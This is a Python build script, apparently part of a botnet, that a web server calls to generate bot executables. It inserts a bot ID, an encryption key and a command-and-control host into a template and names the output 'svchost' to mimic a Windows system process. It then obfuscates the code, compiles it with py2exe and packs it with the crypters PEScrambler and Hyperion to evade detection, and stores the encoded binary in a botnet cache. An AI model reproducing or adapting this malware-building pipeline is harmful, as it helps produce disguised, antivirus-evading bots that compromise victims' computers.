#
#
# create.py - The web server calls this to generate the bot binary 
#
#

import base64
import sys
import py2exe
import random
import hashlib
import os
import string
from subprocess import Popen
from shutil import copyfile
from distutils.core import setup
from uuid import uuid4

def _gen_str(l, h):
    length=random.randint(l, h)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
    
    
print "Setting up pre-binary source code..."

# create constants
ID = str(uuid4())
CIPHER = _gen_str(32, 32)
HOST = 'test.org'
PORT = ''
VERSION = '2.0'

# read template & write to temporary file
file = open('C:\\Main\\template.pyw', 'r')
txt = file.read()
file.close()

txt = txt.replace('__ID__', ID)
txt = txt.replace('__CIPHER__', CIPHER)
txt = txt.replace('__HOST__', HOST)
txt = txt.replace('__PORT__', PORT)
txt = txt.replace('__VERSION__', VERSION)
file = open( 'temp\\svchost.pyw', 'w')
file.write(txt)
file.close()

print "Obfuscating source code..."
Popen('pyminifier -O temp\\svchost.pyw').wait()

# convert to binary
sys.argv.append('py2exe')
setup(
    options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
    console = [{'script':  'temp\\svchost.pyw'}],
    zipfile = None,
)

os.remove('temp\\svchost.pyw')

#print "Obfuscating compiled binary..."
Popen('PEScrambler -i dist\\svchost.exe -o dist\\svchost_encoded.exe')
Popen('hyperion dist\\svchost_encoded.exe dist\\svchost_encoded1.exe')

# read binary & return it
bin = open('dist\\scvhost_encoded1.exe', 'rb')
bin64 = base64.urlsafe_b64encode(bin.read())
bin.close()
out = open('\\\\VBOXSVR\\root\\botnet\\cache\\binary_data', 'a')
out.write(bin64 + ',' + ID + ',' + CIPHER + '\n')
out.close()
